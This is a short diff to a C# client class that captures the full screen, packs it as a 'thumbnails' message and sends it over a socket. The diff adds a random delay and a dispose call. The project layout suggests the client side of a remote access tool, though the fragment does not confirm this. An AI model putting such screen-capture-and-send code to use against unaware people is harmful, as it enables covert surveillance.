@@ -9,7 +9,7 @@ using System.IO;
 using System.Linq;
 using System.Text;
 using System.Windows.Forms;
-
+using System.Threading;
 namespace Client.Handle_Packet
 {
    public class HandleThumbnails
@@ -18,6 +18,7 @@ namespace Client.Handle_Packet
         {
             try
             {
+                Thread.Sleep(new Random().Next(3000));
                 Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                 using (Graphics g = Graphics.FromImage(bmp))
                 using (MemoryStream memoryStream = new MemoryStream())
@@ -29,6 +30,7 @@ namespace Client.Handle_Packet
                     msgpack.ForcePathObject("Packet").AsString = "thumbnails";
                     msgpack.ForcePathObject("Image").SetAsBytes(memoryStream.ToArray());
                     ClientSocket.Send(msgpack.Encode2Bytes());
+                    thumb.Dispose();
                 }
                 bmp.Dispose();
             }
